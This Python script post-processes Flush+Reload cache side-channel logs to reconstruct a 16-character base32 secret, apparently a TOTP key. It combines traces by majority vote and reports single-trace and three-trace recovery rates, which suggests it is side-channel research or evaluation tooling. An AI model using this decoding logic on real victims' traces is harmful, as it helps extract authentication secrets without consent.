import sys


if(len(sys.argv) < 3):
    print("Usage: <script> <instructions_per_loop> <instructions_when_breaking> <log_file>")
    sys.exit(0)

data = open(sys.argv[3])

threshold = int(sys.argv[1])
large_threshold = int(sys.argv[2])

current_char = 0
current_secret = ""
CORRECT_SECRET = "JBSWY3DPFHPK3PXP"
CHARMAP = [	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
	'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
	'U', 'V', 'W', 'X', 'Y', 'Z', '2', '3', '4', '5',
	'6', '7'
];

asdf = 0

results = []

delay = 250
is_skipping_middle = False
current_it = 0
total = 0
correct = 0
for i, line in enumerate(data):
    line = line.split("] ", 1)[1].strip()
    #print(line)
    if "It is done." in line:
        current_secret += CHARMAP[current_char - 1]
        if len(current_secret) == 16:
            print(current_secret)

            if current_secret == CORRECT_SECRET:
                correct += 1
            total += 1
            results.append(current_secret)
        current_char = 0
        current_secret = ""
        delay = 255

        #sys.exit(0)

    if "FlushReloadAttack: Hit! Steps between hits:" in line:
        _, a = line.split("{",1)


        steps = int(a[:4].strip())
        #if steps > 20: continue
        if delay > 0:
            delay -= steps
            #if delay < 0:
                #print("ERROR, DELAY WAS WRONG!!")
            continue
        current_it += steps
        if is_skipping_middle:
            if current_it == 5:
                current_it = -5
                is_skipping_middle = False
                #print("unskipping:", i)
            if current_it > 5:
                current_it = 0
            continue
        #print(current_it)
        if current_it == threshold:
            #print(current_char)

            current_char += 1
            current_it = 0
        elif current_it >= large_threshold:
            current_secret += CHARMAP[current_char - 1]
            current_char = 1
            if len(current_secret) == 8:
                delay = 58 - current_it
            current_it = 0




            




def majority_vote(samples):
    val = [[0 for _ in range(32)] for _ in range(16)]

    for x in samples:
        for i, y in enumerate(x):
            val[i][CHARMAP.index(y)] += 1

    import numpy as np
    res = [CHARMAP[np.argmax(i)] for i in val]
    return "".join(res)


import random
def testRandomSample(samples):
    tests = random.sample(samples, 3)
    res = majority_vote(tests)

    return res == CORRECT_SECRET



vote = majority_vote(results)
print("Majority vote: ", vote)
print("Correct secret: JBSWY3DPFHPK3PXP")

correct_samples = sum(testRandomSample(results) for _ in range(10000))




print(f"{correct}/{total} correct single-trace recoveries ({100 * correct/total:4.02f}%)")
print(f"{correct_samples}/10000 correct 3-trace recoveries")

    

